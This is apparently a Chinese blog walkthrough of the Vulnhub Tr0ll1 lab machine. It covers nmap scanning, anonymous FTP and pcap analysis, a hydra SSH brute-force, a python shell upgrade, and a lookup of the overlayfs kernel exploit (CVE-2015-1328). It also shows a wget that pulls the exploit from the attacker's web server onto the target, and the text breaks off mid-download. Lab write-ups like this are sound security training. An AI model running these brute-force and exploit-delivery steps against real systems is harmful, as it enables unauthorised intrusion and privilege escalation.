---
layout: post
title: "Vulnhub靶机渗透-TR0LL1"
date: 2025-03-07 17:36:16 +0800
description: "访问sup3rs3cr3tdirlol目录，可以下载名为roflmao的文件。cat是一堆乱码，用strings从二进制文件中提取可打印的字符序列。从最初的nmap扫描中得知ftp匿名登录，用户名为anonymous，密码为空。根据字符中的提示访问0x0856BF，两个文件。，有的，使用python改善交互shell。python起web服务供靶机下载exp。试试TCP、UDP扫描，没啥东西。WireShark分析流量包。查询是否有python环境。寻找内核payload。hydra爆破SSH。"
keywords: "Vulnhub靶机渗透-TR0LL1"
categories: ['靶机渗透']
tags: ['网络安全', '服务器', 'Linux']
artid: "146101142"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146101142
    alt: "Vulnhub靶机渗透-TR0LL1"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146101142
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146101142
cover: https://bing.ee123.net/img/rand?artid=146101142
image: https://bing.ee123.net/img/rand?artid=146101142
img: https://bing.ee123.net/img/rand?artid=146101142
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     Vulnhub靶机渗透-TR0LL1
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atom-one-dark" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <p>
    </p>
    <p>
    </p>
    <pre><code>Description

Tr0ll was inspired by the constant trolling of the machines within the OSCP labs.

The goal is simple, gain root and get Proof.txt from the /root directory.

Not for the easily frustrated! Fair warning, there be trolls ahead!

Difficulty: Beginner ; Type: boot2root

Special thanks to @OS_Eagle11 and @superkojiman for suffering through the testing all the way to root!

The machine should pull an IP using DHCP, if you have any problems, contact me for a password to get it to working.

Feedback is always appreciated!

说明
Tr0ll的灵感来自OSCP实验室内机器的不断拖动。
目标很简单，获取root并从/root目录获取Proof.txt。
不适合容易受挫的人！公平的警告，前方有巨魔！
难度：初学者；类型：boot2root
特别感谢@OS_Eagle11和@supernojiman一路忍受着测试的痛苦！
机器应该使用DHCP拉取IP，如果您有任何问题，请联系我获取密码以使其正常工作。
我们始终感谢您的反馈！
</code></pre>
    <pre><code class="prism language-bash">└─<span class="token comment"># nmap -p- -Pn -A 192.168.1.170 -o nmap.txt                                </span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-19 <span class="token number">10</span>:54 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.170
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00056s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65532</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>     vsftpd <span class="token number">3.0</span>.2

<span class="token comment"># ftp匿名登录</span>

<span class="token operator">|</span> ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code <span class="token number">230</span><span class="token punctuation">)</span>
<span class="token operator">|</span>_-rwxrwxrwx    <span class="token number">1</span> <span class="token number">1000</span>     <span class="token number">0</span>            <span class="token number">8068</span> Aug 09  <span class="token number">2014</span> lol.pcap <span class="token punctuation">[</span>NSE: writeable<span class="token punctuation">]</span>
<span class="token operator">|</span> ftp-syst: 
<span class="token operator">|</span>   STAT: 
<span class="token operator">|</span> FTP server status:
<span class="token operator">|</span>      Connected to <span class="token number">192.168</span>.1.99
<span class="token operator">|</span>      Logged <span class="token keyword">in</span> as <span class="token function">ftp</span>
<span class="token operator">|</span>      TYPE: ASCII
<span class="token operator">|</span>      No session bandwidth limit
<span class="token operator">|</span>      Session <span class="token function">timeout</span> <span class="token keyword">in</span> seconds is <span class="token number">600</span>
<span class="token comment"># 控制连接是以明文形式进行的</span>
<span class="token operator">|</span>      Control connection is plain text
<span class="token comment"># 数据连接也是明文</span>
<span class="token operator">|</span>      Data connections will be plain text
<span class="token operator">|</span>      At session startup, client count was <span class="token number">4</span>
<span class="token operator">|</span>      vsFTPd <span class="token number">3.0</span>.2 - secure, fast, stable
<span class="token operator">|</span>_End of status
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">6.6</span>.1p1 Ubuntu 2ubuntu2 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">1024</span> d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">2048</span> ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.7 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
<span class="token operator">|</span>_http-server-header: Apache/2.4.7 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span> http-robots.txt: <span class="token number">1</span> disallowed entry 
<span class="token operator">|</span>_/secret
MAC Address: <span class="token number">30</span>:03:C8:49:52:4D <span class="token punctuation">(</span>Cloud Network Technology Singapore PTE.<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux <span class="token number">3.2</span> - <span class="token number">4.9</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OSs: Unix, Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.56</span> ms <span class="token number">192.168</span>.1.170

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">23.42</span> seconds
</code></pre>
    <p>
     试试TCP、UDP扫描，没啥东西
    </p>
    <pre><code class="prism language-bash">└─<span class="token comment"># nmap -sT 192.168.1.170 -p- --min-rate 10000 -oA tcpscan                  </span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-19 <span class="token number">10</span>:47 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.170
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0018s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65532</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http
MAC Address: <span class="token number">30</span>:03:C8:49:52:4D <span class="token punctuation">(</span>Cloud Network Technology Singapore PTE.<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">1.82</span> seconds

└─<span class="token comment"># nmap -sU 192.168.236.136 --min-rate 10000 -Pn -p- -oA udpscan</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-19 <span class="token number">10</span>:52 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.236.136
Host is up.
All <span class="token number">65535</span> scanned ports on <span class="token number">192.168</span>.236.136 are <span class="token keyword">in</span> ignored states.
Not shown: <span class="token number">65535</span> <span class="token function">open</span><span class="token operator">|</span>filtered udp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">27.94</span> seconds
</code></pre>
    <p>
     脆弱性扫描
    </p>
    <pre><code class="prism language-bash">└─<span class="token comment"># nmap 192.168.1.170 --script vuln -o scriptvuln                           </span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-19 <span class="token number">11</span>:07 CST
Pre-scan script results:
<span class="token operator">|</span> broadcast-avahi-dos: 
<span class="token operator">|</span>   Discovered hosts:
<span class="token operator">|</span>     <span class="token number">224.0</span>.0.251
<span class="token operator">|</span>   After NULL UDP avahi packet DoS <span class="token punctuation">(</span>CVE-2011-1002<span class="token punctuation">)</span>.
<span class="token operator">|</span>_  Hosts are all up <span class="token punctuation">(</span>not vulnerable<span class="token punctuation">)</span>.

Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.170                                                                                                                                                                    
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0023s latency<span class="token punctuation">)</span>.                                                                                                                                                                         
Not shown: <span class="token number">997</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>                                                                                                                                                               
PORT   STATE SERVICE                                                                                                                                                                                  
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>                                                                                                                                                                                      
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>                                                                                                                                                                                      
<span class="token number">80</span>/tcp <span class="token function">open</span>  http                                                                                                                                                                                     
<span class="token operator">|</span>_http-stored-xss: Couldn<span class="token string">'t find any stored XSS vulnerabilities.                                                                                                                                      
| http-slowloris-check:                                                                                                                                                                               
|   VULNERABLE:                                                                                                                                                                                       
|   Slowloris DOS attack                                                                                                                                                                              
|     State: LIKELY VULNERABLE                                                                                                                                                                        
|     IDs:  CVE:CVE-2007-6750                                                                                                                                                                         
|       Slowloris tries to keep many connections to the target web server open and hold                                                                                                               
|       them open as long as possible.  It accomplishes this by opening connections to                                                                                                                
|       the target web server and sending a partial request. By doing so, it starves                                                                                                                  
|       the http server'</span>s resources causing Denial Of Service.                                                                                                                                        
<span class="token operator">|</span>                                                                                                                                                                                                     
<span class="token operator">|</span>     Disclosure date: <span class="token number">2009</span>-09-17                                                                                                                                                                     
<span class="token operator">|</span>     References:                                                                                                                                                                                     
<span class="token operator">|</span>       http://ha.ckers.org/slowloris/
<span class="token operator">|</span>_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2007-6750
<span class="token operator">|</span>_http-csrf: Couldn<span class="token string">'t find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn'</span>t <span class="token function">find</span> any DOM based XSS.
<span class="token operator">|</span> http-enum: 
<span class="token operator">|</span>   /robots.txt: Robots <span class="token function">file</span>
<span class="token operator">|</span>_  /secret/: Potentially interesting folder
MAC Address: <span class="token number">30</span>:03:C8:49:52:4D <span class="token punctuation">(</span>Cloud Network Technology Singapore PTE.<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">345.77</span> seconds
</code></pre>
    <p>
     从最初的nmap扫描中得知ftp匿名登录，用户名为anonymous，密码为空。拿到一个数据包
    </p>
    <pre><code class="prism language-bash">└─<span class="token comment"># ftp 192.168.1.170</span>
Connected to <span class="token number">192.168</span>.1.170.
<span class="token number">220</span> <span class="token punctuation">(</span>vsFTPd <span class="token number">3.0</span>.2<span class="token punctuation">)</span>
Name <span class="token punctuation">(</span><span class="token number">192.168</span>.1.170:kali<span class="token punctuation">)</span>: anonymous
<span class="token number">331</span> Please specify the password.
Password: 
<span class="token number">230</span> Login successful.
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">&gt;</span> <span class="token function">ls</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">55380</span><span class="token operator">|</span><span class="token punctuation">)</span>.
<span class="token number">150</span> Here comes the directory listing.
<span class="token parameter variable">-rwxrwxrwx</span>    <span class="token number">1</span> <span class="token number">1000</span>     <span class="token number">0</span>            <span class="token number">8068</span> Aug 09  <span class="token number">2014</span> lol.pcap
<span class="token number">226</span> Directory send OK.
ftp<span class="token operator">&gt;</span> get lol.pcap
local: lol.pcap remote: lol.pcap
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">25791</span><span class="token operator">|</span><span class="token punctuation">)</span>.
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> lol.pcap <span class="token punctuation">(</span><span class="token number">8068</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>*********************************************************************************************************************************************************<span class="token operator">|</span>  <span class="token number">8068</span>      <span class="token number">730.27</span> KiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">8068</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">703.15</span> KiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">&gt;</span> <span class="token builtin class-name">exit</span>
<span class="token number">221</span> Goodbye.

┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Vulnhub/Tr0ll<span class="token punctuation">]</span>
└─<span class="token comment"># ls</span>
lol.pcap
</code></pre>
    <p>
     WireShark分析流量包
    </p>
    <pre><code class="prism language-bash"><span class="token comment"># 跟踪FTP协议相关流量的TCP流，发现secret_stuff.txt</span>
<span class="token number">200</span> PORT <span class="token builtin class-name">command</span> successful. Consider using PASV.

RETR secret_stuff.txt

<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> secret_stuff.txt <span class="token punctuation">(</span><span class="token number">147</span> bytes<span class="token punctuation">)</span>.

<span class="token number">226</span> Transfer complete.
<span class="token comment"># 右下角切换到stream 2，得到具体内容，提示了sup3rs3cr3tdirlol目录</span>
-rw-r--r-- <span class="token number">1</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">147</span> Aug <span class="token number">10</span> 00:38 secret_stuff.txt

Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P

Sucks, you were so close<span class="token punctuation">..</span>. gotta TRY HARDER<span class="token operator">!</span>

</code></pre>
    <p>
     通过dirsearch扫描目录得到robots.txt
    </p>
    <pre><code class="prism language-bash">User-agent:*

<span class="token comment"># 访问是一张很欠的图片，u mad？</span>
Disallow: /secret
</code></pre>
    <p>
     访问sup3rs3cr3tdirlol目录，可以下载名为roflmao的文件。cat是一堆乱码，用strings从二进制文件中提取可打印的字符序列
    </p>
    <pre><code>└─# strings roflmao                                                                                                                                                                                   
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
printf
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
[^_]

# 
Find address 0x0856BF to proceed
;*2$"
GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
crtstuff.c
__JCR_LIST__
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
completed.6590
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
roflmao.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
data_start
printf@@GLIBC_2.0
_edata
_fini
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_end
_start
_fp_hw
__bss_start
main
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
_init
</code></pre>
    <p>
     根据字符中的提示访问0x0856BF，两个文件
     <code>
      which_one_lol.txt
     </code>
     <code>
      Pass.txt
     </code>
    </p>
    <pre><code class="prism language-bash">└─<span class="token comment"># cat which_one_lol.txt </span>
maleus
ps-aux
felux
Eagle11
genphlux <span class="token operator">&lt;</span> -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow

└─<span class="token comment"># cat Pass.txt </span>
Good_job_:<span class="token punctuation">)</span>
</code></pre>
    <p>
     hydra爆破SSH
    </p>
    <pre><code class="prism language-bash"><span class="token comment"># 不太行的样子</span>

└─<span class="token comment"># hydra -L which_one_lol.txt -P Pass.txt 192.168.1.170 ssh                                                                                                                                          </span>
Hydra v9.5 <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2023</span> by van Hauser/THC <span class="token operator">&amp;</span> David Maciejak - Please <span class="token keyword">do</span> not use <span class="token keyword">in</span> military or secret <span class="token function">service</span> organizations, or <span class="token keyword">for</span> illegal purposes <span class="token punctuation">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="token punctuation">)</span>.

Hydra <span class="token punctuation">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="token punctuation">)</span> starting at <span class="token number">2025</span>-02-19 <span class="token number">17</span>:30:39
<span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use <span class="token parameter variable">-t</span> <span class="token number">4</span>
<span class="token punctuation">[</span>DATA<span class="token punctuation">]</span> max <span class="token number">10</span> tasks per <span class="token number">1</span> server, overall <span class="token number">10</span> tasks, <span class="token number">10</span> login tries <span class="token punctuation">(</span>l:10/p:1<span class="token punctuation">)</span>, ~1 try per task
<span class="token punctuation">[</span>DATA<span class="token punctuation">]</span> attacking ssh://192.168.1.170:22/
<span class="token number">1</span> of <span class="token number">1</span> target completed, <span class="token number">0</span> valid password found
Hydra <span class="token punctuation">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="token punctuation">)</span> finished at <span class="token number">2025</span>-02-19 <span class="token number">17</span>:30:46

<span class="token comment"># 将密码换成文件名本身后成功</span>

┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Vulnhub/Tr0ll<span class="token punctuation">]</span>
└─<span class="token comment"># hydra -L which_one_lol.txt -p Pass.txt 192.168.1.170 ssh</span>
Hydra v9.5 <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2023</span> by van Hauser/THC <span class="token operator">&amp;</span> David Maciejak - Please <span class="token keyword">do</span> not use <span class="token keyword">in</span> military or secret <span class="token function">service</span> organizations, or <span class="token keyword">for</span> illegal purposes <span class="token punctuation">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="token punctuation">)</span>.

Hydra <span class="token punctuation">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="token punctuation">)</span> starting at <span class="token number">2025</span>-02-19 <span class="token number">17</span>:31:52
<span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use <span class="token parameter variable">-t</span> <span class="token number">4</span>
<span class="token punctuation">[</span>DATA<span class="token punctuation">]</span> max <span class="token number">10</span> tasks per <span class="token number">1</span> server, overall <span class="token number">10</span> tasks, <span class="token number">10</span> login tries <span class="token punctuation">(</span>l:10/p:1<span class="token punctuation">)</span>, ~1 try per task
<span class="token punctuation">[</span>DATA<span class="token punctuation">]</span> attacking ssh://192.168.1.170:22/

<span class="token comment">#</span>
<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">[</span>ssh<span class="token punctuation">]</span> host: <span class="token number">192.168</span>.1.170   login: overflow   password: Pass.txt
<span class="token number">1</span> of <span class="token number">1</span> target successfully completed, <span class="token number">1</span> valid password found
Hydra <span class="token punctuation">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="token punctuation">)</span> finished at <span class="token number">2025</span>-02-19 <span class="token number">17</span>:31:55
</code></pre>
    <pre><code class="prism language-bash">└─$ <span class="token function">ssh</span> overflow@192.168.1.170
overflow@192.168.1.170's password: 
Welcome to Ubuntu <span class="token number">14.04</span>.1 LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">3.13</span>.0-32-generic i686<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Aug <span class="token number">13</span> 01:14:09 <span class="token number">2014</span> from <span class="token number">10.0</span>.0.12
Could not chdir to home directory /home/overflow: No such <span class="token function">file</span> or directory 
$ 
</code></pre>
    <p>
     查询是否有python环境
     <code>
      dpkg -l | grep python
     </code>
     ，有的，使用python改善交互shell
    </p>
    <pre><code class="prism language-bash">$ python <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/bash")'</span>
overflow@troll:/$ 
</code></pre>
    <p>
     提权
    </p>
    <pre><code class="prism language-bash"><span class="token comment"># find看起来不太好提权</span>
overflow@troll:/$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/mtr
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/su
/bin/ping
/bin/fusermount
/bin/ping6
/bin/mount
/bin/umount

<span class="token comment"># 该用户无法使用sudo</span>
overflow@troll:/$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
sudo: unable to resolve <span class="token function">host</span> troll
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> overflow: 
Sorry, user overflow may not run <span class="token function">sudo</span> on troll.

<span class="token comment"># 查看内核版本</span>
overflow@troll:/$ <span class="token function">uname</span> <span class="token parameter variable">-a</span>
Linux troll <span class="token number">3.13</span>.0-32-generic <span class="token comment">#57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 athlon i686 GNU/Linux</span>
$ <span class="token function">cat</span> /etc/os-release
<span class="token assign-left variable">NAME</span><span class="token operator">=</span><span class="token string">"Ubuntu"</span>
<span class="token assign-left variable">VERSION</span><span class="token operator">=</span><span class="token string">"14.04.1 LTS, Trusty Tahr"</span>
<span class="token assign-left variable">ID</span><span class="token operator">=</span>ubuntu
<span class="token assign-left variable">ID_LIKE</span><span class="token operator">=</span>debian
<span class="token assign-left variable">PRETTY_NAME</span><span class="token operator">=</span><span class="token string">"Ubuntu 14.04.1 LTS"</span>
<span class="token assign-left variable">VERSION_ID</span><span class="token operator">=</span><span class="token string">"14.04"</span>
<span class="token assign-left variable">HOME_URL</span><span class="token operator">=</span><span class="token string">"http://www.ubuntu.com/"</span>
<span class="token assign-left variable">SUPPORT_URL</span><span class="token operator">=</span><span class="token string">"http://help.ubuntu.com/"</span>
<span class="token assign-left variable">BUG_REPORT_URL</span><span class="token operator">=</span><span class="token string">"http://bugs.launchpad.net/ubuntu/"</span>

</code></pre>
    <p>
     寻找内核payload
    </p>
    <pre><code class="prism language-bash">└─<span class="token comment"># searchsploit Linux 3.13.0 --id</span>

Linux Kernel <span class="token number">3.13</span>.0 <span class="token operator">&lt;</span> <span class="token number">3.19</span> <span class="token punctuation">(</span>Ubuntu <span class="token number">12.04</span>/14.04/14.10/15.04<span class="token punctuation">)</span> - <span class="token string">'overlayfs'</span> Local Privilege Escalation                                                              <span class="token operator">|</span> <span class="token number">37292</span>

└─<span class="token comment"># searchsploit 37292 -p         </span>
  Exploit: Linux Kernel <span class="token number">3.13</span>.0 <span class="token operator">&lt;</span> <span class="token number">3.19</span> <span class="token punctuation">(</span>Ubuntu <span class="token number">12.04</span>/14.04/14.10/15.04<span class="token punctuation">)</span> - <span class="token string">'overlayfs'</span> Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
    Codes: CVE-2015-1328
 Verified: True
File Type: C source, ASCII text, with very long lines <span class="token punctuation">(</span><span class="token number">466</span><span class="token punctuation">)</span>

└─<span class="token comment"># cp /usr/share/exploitdb/exploits/linux/local/37292.c ./exploit.c</span>

<span class="token comment"># 当然也可以这样</span>
└─<span class="token comment"># searchsploit -m 37292.c</span>
  Exploit: Linux Kernel <span class="token number">3.13</span>.0 <span class="token operator">&lt;</span> <span class="token number">3.19</span> <span class="token punctuation">(</span>Ubuntu <span class="token number">12.04</span>/14.04/14.10/15.04<span class="token punctuation">)</span> - <span class="token string">'overlayfs'</span> Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
    Codes: CVE-2015-1328
 Verified: True
File Type: C source, ASCII text, with very long lines <span class="token punctuation">(</span><span class="token number">466</span><span class="token punctuation">)</span>
Copied to: /root/Vulnhub/Tr0ll/37292.c



┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Vulnhub/Tr0ll<span class="token punctuation">]</span>
└─<span class="token comment"># ls</span>
<span class="token number">37292</span>.c 
</code></pre>
    <p>
     python起web服务供靶机下载exp
    </p>
    <pre><code>└─# python -m http.server 8888   
</code></pre>
    <p>
     下载、编译并使用
    </p>
    <pre><code class="prism language-bash">$ <span class="token builtin class-name">pwd</span>
/tmp
$ <span class="token function">wget</span> http://192.168.1.247:8888/exploit.c
--2025-03-07 00:56:33--  http://192.168.1.247:8888/exploit.c
Connecting to <span class="token number">192.168</span>.1.247:8888<span class="token punctuation">..</span>. connected.
HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
Length: <span class="token number">4968</span> <span class="token punctuation">(</span><span class="token number">4</span>.9K<span class="token punctuation">)</span> <span class="token punctuation">[</span>text/x-csrc<span class="token punctuation">]</span>
Saving to: ‘exploit.c’

<span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token 